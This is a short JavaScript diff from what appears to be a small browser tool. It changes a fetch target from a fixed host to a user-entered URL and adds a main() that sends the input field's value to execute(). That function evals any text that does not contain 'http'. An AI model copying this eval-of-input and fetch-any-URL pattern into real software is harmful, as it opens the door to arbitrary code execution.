@@ -4,7 +4,7 @@ window.addEventListener('DOMContentLoaded', () => {
 
 function execute(code) {
     if (code.includes('http')) {
-        fetch("https://gamr.cf/", {
+        fetch(document.getElementById('url').value, {
                 "method": "GET",
                 "headers": {
                     "Content-Type": "application/x-www-form-urlencoded"
@@ -20,4 +20,8 @@ function execute(code) {
     } else {
                 eval(code);
     }
+}
+
+function main(){
+    execute(document.getElementById('url').value)
 }
